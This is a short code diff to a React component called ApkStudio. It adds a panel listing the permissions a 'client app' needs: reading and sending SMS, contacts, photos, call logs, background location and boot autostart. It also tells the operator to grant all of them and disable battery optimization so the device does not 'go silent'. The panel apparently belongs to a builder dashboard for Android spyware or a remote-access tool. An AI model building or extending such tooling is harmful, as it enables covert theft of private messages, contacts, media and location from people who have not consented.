@@ -131,6 +131,22 @@ export function ApkStudio() {
           </Badge>
         </div>
 
+        <div className="bg-card border border-card-border rounded-2xl p-5">
+          <div className="flex items-center gap-2 mb-3">
+            <Shield className="w-4 h-4 text-primary" />
+            <h2 className="font-display text-sm font-bold tracking-wide">CLIENT APP — REQUIRED PERMISSIONS</h2>
+          </div>
+          <ul className="grid sm:grid-cols-2 gap-x-6 gap-y-1.5 font-mono text-xs text-muted-foreground">
+            <li>SMS — read + send</li>
+            <li>Contacts — address book</li>
+            <li>Photos &amp; Videos — media</li>
+            <li>Phone + Call logs</li>
+            <li>Location (background)</li>
+            <li>Storage + Boot autostart</li>
+          </ul>
+          <p className="mt-3 text-[11px] text-muted-foreground">After install: grant all permissions + disable battery optimization, or the device goes silent.</p>
+        </div>
+
         <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
           <div className="bg-card border border-card-border rounded-2xl p-5 space-y-4">
             <div className="space-y-2">
